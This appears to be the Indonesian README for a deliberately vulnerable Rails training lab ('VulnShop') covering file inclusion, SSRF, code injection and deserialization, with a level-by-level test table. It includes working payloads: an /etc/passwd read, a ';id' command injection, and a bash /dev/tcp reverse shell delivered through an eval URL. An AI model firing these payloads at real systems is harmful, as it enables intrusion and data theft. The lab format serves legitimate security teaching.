# VulnShop — Lab RFI / LFI / SSRF / RCE

Lab kerentanan web buat belajar berbagai teknik. Setiap mode punya proteksi beda di tiap level (LOW / MEDIUM / HIGH), dan tiap proteksi bisa di-bypass.

Semua payload di sini **nggak butuh bikin file**. Pakai `data:` URL, URL publik, atau `file://` yang udah ada di sistem.

---

## Persiapan

Jalankan Rails:

```bash
cd /home/lynx/vulnshop
bin/rails server
```

Buka halaman lab:

```
http://127.0.0.1:3000/fetch
```

Ganti level:

```
http://127.0.0.1:3000/fetch?level=low
http://127.0.0.1:3000/fetch?level=medium
http://127.0.0.1:3000/fetch?level=high
```

---

## Level

| Level | Proteksi |
|---|---|
| **LOW** | Nggak ada |
| **MEDIUM** | Filter dasar, bisa di-bypass |
| **HIGH** | Proteksi otomatis (cek realpath, tipe data, IP internal) |

---

## Mode

| Mode | Fungsi |
|---|---|
| `read` | Baca file lokal / fetch remote (LFI / RFI) |
| `eval` | Eksekusi kode Ruby (RCE) |
| `system` | Command injection via shell |
| `yaml` | Deserialization YAML |
| `marshal` | Deserialization Marshal |
| `ssrf` | Fetch ke layanan internal |
| `gopher` | SSRF ke Redis/MySQL |

## Alur Tes

LOW — semua harus jalan:

| Mode | URL |
|---|---|
| `read` | `file:///etc/passwd` |
| `read` | `http://example.com` |
| `eval` | ``data:text/plain,`id` `` |
| `system` | `;id` |
| `yaml` | `data:text/plain,key: value` |

## Reverse Shell

Terminal 1 — listener:

```bash
nc -lvnp 4444
```

Browser:

```
http://127.0.0.1:3000/fetch?level=low&mode=eval&url=data:text/plain,system("bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'")
```

---

## Blind SSRF

Terminal 1 — listener:

```bash
nc -lvnp 9999
```

Browser:

```
http://127.0.0.1:3000/fetch?level=low&mode=read&url=http://127.0.0.1:9999/test
```

Kalau terminal 1 muncul request → blind SSRF confirmed.

---

## Catatan

- Lab ini **sengaja vulnerable**. Jalanin cuma di VM/container terisolasi.
- Jangan expose ke internet.
- Mode `eval`, `system`, `yaml`, `marshal` = **RCE penuh** di level LOW.
- Ruby modern (Psych 4+) udah lebih aman buat `YAML.load` — payload gadget mungkin perlu disesuaikan.
- `Marshal.load` butuh gadget chain dari gem yang ada di target.
